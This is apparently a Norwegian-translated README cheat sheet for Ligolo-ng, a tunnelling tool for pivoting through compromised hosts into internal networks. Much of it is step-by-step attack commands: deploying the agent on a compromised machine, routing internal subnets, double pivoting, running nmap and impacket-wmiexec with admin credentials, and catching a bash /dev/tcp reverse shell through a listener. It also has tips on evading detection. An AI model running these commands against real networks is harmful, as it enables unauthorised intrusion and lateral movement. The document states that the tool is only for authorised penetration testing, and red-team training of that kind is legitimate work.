<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - Komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN-grensesnitt">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Nettverkspivoting">
</p>

<p align="center">
  <b>🌐 Moderne, enkelt og høyytelses pivoteringsverktøy som bruker TUN-grensesnitt i stedet for SOCKS-proxyer</b>
</p>

---

## 📋 Innholdsfortegnelse

– [Introduksjon](#-introduksjon)
- [Hvorfor Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
- [Arkitektur og hvordan det fungerer](#-arkitektur--hvordan-det-fungerer)
- [Installasjon](#-installasjon)
- [Hurtigstartguide](#-hurtigstartguide)
  - [Trinn 1: Konfigurer TUN-grensesnitt på angriper](#step-1-setup-tun-interface-on-attacker)
  - [Trinn 2: Start Ligolo-ng-proxyen](#step-2-start-the-ligolo-ng-proxyen)
  - [Trinn 3: Distribuer agenten på pivotmål](#step-3-deploy-the-agent-on-pivot-target)
  - [Trinn 4: Konfigurer ruting på angriper](#step-4-configure-routing-on-attacker)
  - [Trinn 5: Start tunneløkten](#step-5-start-the-tunnel-session)
- [Reverse Port Forwarding (Listeners)](#-reverse-port-videresending-lyttere)
- [Dobbelpivoting (Flerlagspivoting)](#-dobbelpivoting-flerlagspivoting)
- [Proxy Interactive Commands Reference](#-proxy-interactive-commands-reference)
- [Agent kommandolinjealternativer](#-agent-kommandolinjealternativer)
– [Feilsøking og beste fremgangsmåter](#-feilsøking--beste praksis)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)
- [Ressurser](#-ressurser)

---

## 🎯 Introduksjon

**Ligolo-ng** er et avansert, lett og raskt verktøy for tunnelering og svinging skrevet i Go. I motsetning til tradisjonelle SOCKS-proxyer (som standard Chisel eller SSH dynamisk videresending), etablerer Ligolo-ng et virtuelt **TUN-grensesnitt** direkte på angripermaskinen din.

Dette gjør din kompromitterte pivotvert til en ekte VPN-lignende gateway: alle verktøy på angripermaskinen din (inkludert `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` og nettlesere) kan få tilgang til interne undernett direkte via IP-adresse uten å prefiksere kommandoer med `proxychains`.

---

## ⚖️ Hvorfor Ligolo-ng?

| Funksjon | Ligolo-ng | Proxychains + SOKKER | SSH SOKKER (`-D`) |
|--------|--------|---------------------|----------------|
| **Protokollstøtte** | Full TCP og UDP | Bare TCP (dårlig UDP) | Kun TCP |
| **Nmap SYN Scan (`-sS`)**| ✅ Ja (innfødt) | ❌ Nei (Krever TCP `-sT`) | ❌ Nei |
| **Verktøykompatibilitet** | 100 % (Kjerne IP-stabel) | Inkonsekvent (LD_PRELOAD) | Inkonsekvent |
| **Hastighet og ventetid** | ⭐⭐⭐⭐⭐ Veldig rask | ⭐⭐⭐ Moderat | ⭐⭐⭐ Moderat |
| **Ingen SOCKS Wrapper** | ✅ Ja | ❌ Krever innpakning | ❌ Krever innpakning |
| **Reverselyttere** | ✅ Innebygd | ❌ Krever eget verktøy | ❌ Begrenset |

---

## 🏗️ Arkitektur og hvordan det fungerer
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy:** Kjører på angripermaskinen din, administrerer økter og kobler pakker mellom ditt virtuelle TUN-grensesnitt og tilkoblede agenter.
2. **Agent:** En lett binær som kjøres på den kompromitterte interne maskinen (Linux, Windows, macOS eller ARM).
3. **TUN-grensesnitt:** Et programvare loopback-nettverksgrensesnitt opprettet på Linux som ruter trafikk destinert for interne undernett rett inn i Ligolo.

---

## 📥 Installasjon

Last ned de siste utgivelsesbinærfilene for både **proxy** og **agent** fra den offisielle GitHub-utgivelsessiden:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Hurtigstartguide

### Trinn 1: Sett opp TUN-grensesnitt på angriper

Før du kjører proxyen, lag en vedvarende TUN-enhet på din Linux-angripermaskin:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Trinn 2: Start Ligolo-ng Proxy

Kjør proxyen ved å bruke selvsignerte TLS-sertifikater:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Tips:** Du kan også gi gyldige Let's Encrypt-sertifikater ved å bruke `-certfile` og `-keyfile` for sniking i Red Team-engasjementer.

### Trinn 3: Distribuer agenten på Pivot Target

Overfør agenten til den kompromitterte verten og utfør den:

#### På Linux-mål:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### På Windows-mål:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Trinn 4: Konfigurer ruting på angriper

Når agenten kobler til, inspiser nettverksgrensesnittene fra proxy-konsollen for å finne målets interne undernett (f.eks. `172.16.1.0/24`).

På din **angriperterminal** (separat vindu), legg til en rute som peker til TUN-grensesnittet:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Trinn 5: Start tunneløkten

I den interaktive Ligolo-ng proxy-prompten:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
Nå har du direkte, naturlig IP-tilgang til det interne nettverket! Test det:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Videresending av omvendt port (lyttere)

Vil du motta et omvendt skall eller fange et NTLM-autentiseringsrelé på angriperboksen din fra en intern vert som ikke kan rute tilbake til angriperens IP? Bruk **lyttere**!

Når du konfigurerer en lytter i Ligolo-ng, åpner agenten en lytteport på **pivotmaskinen** og videresender innkommende trafikk tilbake til angripermaskinen din.

### Eksempel: Å fange et omvendt skall

Inne i proxy-sesjonen:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
På din **angripermaskin**:
```bash
nc -lvnp 4444
```
På et **internt mål** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
Pivotverten videresender forbindelsen rett til din Netcat-lytter!

---

## ⛓️ Dobbel pivotering (flerlagspivotering)

Når du får tilgang til dypt nestede nettverk (Subnett A -> Undernett B -> Undernett C):

1. Etabler din første tunnel til Pivot 1 (`172.16.1.10`).
2. Oppdag Pivot 2 som ligger i undernett B (`10.0.0.25`).
3. Sett opp en lytter på Pivot 1 for å videresende trafikk fra undernett B tilbake til proxy-porten `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Distribuer Ligolo-agenten på Pivot 2 og koble til Pivot 1s IP:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. En andre økt vil vises i proxyen din! Legg til en rute for undernett C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Bytt til økt 2 og skriv `start`.

---

## ⌨️ Proxy Interactive Commands Reference

| Kommando | Beskrivelse | Eksempel |
|--------|-------------|--------|
| `session` | List og velg aktive tilkoblede agentsesjoner | `session` |
| `start` | Start tunnelering av pakker gjennom den aktive agenten | `start` |
| `stop` | Stopp den aktive tunneløkten | `stop` |
| `ifconfig` | Vis nettverksgrensesnitt for den valgte agenten | `ifconfig` |
| `listener_add` | Opprett en lytteport på pivotagenten | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Liste alle aktive lyttere på gjeldende agent | `listener_list` |
| `listener_close`| Lukk en bestemt aktiv lytter | `listener_close --id 0` |
| `help` | Vis kommandohjelp | `help` |
| `exit` | Avslutt proxy eller gå tilbake til hovedmenyen | `exit` |

---

## ⚙️ Agent-kommandolinjealternativer

| Flagg | Beskrivelse | Eksempel |
|------|----------------|--------|
| `-connect` | Adresse og havn til Ligolo proxy | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Hopp over TLS-sertifikatverifisering | `-ignore-cert` |
| `-retry` | Prøv automatisk å koble til på nytt hvis frakoblet | `-retry` |
| `-auto-clear` | Slett terminalutgang ved utførelse | `-auto-clear` |

---

## 💡 Feilsøking og beste praksis

1. **Slett TUN-grensesnitt etter engasjement:**
   Når du er ferdig med testen, ryd opp i rutetabellen og slett det virtuelle grensesnittet:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Dobbeltsjekk IP-undernettoverlappinger:**
   Sørg for at det interne undernettet du ruter (f.eks. `192.168.1.0/24`) ikke kolliderer med ditt lokale angripernettverk. Hvis den overlapper, bruk en mer spesifikk `/32` vertsrute (f.eks. `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Brannmurhensyn på Pivot:**
   På Windows-mål, sørg for at Windows Defender-brannmuren tillater utgående tilkoblinger på port 11601 eller din valgte lytterport.
4. **Bruk `-retry` i virkelige miljøer:**
   Kjør alltid agenter med `-retry` for automatisk å reetablere tilkoblinger etter forbigående nettverksfall.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> **VIKTIG:** Ligolo-ng er et kraftig nettverksrutingsverktøy. Den må kun brukes under autoriserte penetrasjonstester, røde teamengasjementer og etiske sikkerhetsevalueringer med eksplisitt skriftlig samtykke.

---

## 📚 Ressurser

- [Offisielt Ligolo-ng GitHub-lager](https://github.com/nicocha30/ligolo-ng)
- [Offisiell Ligolo-ng-dokumentasjon](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)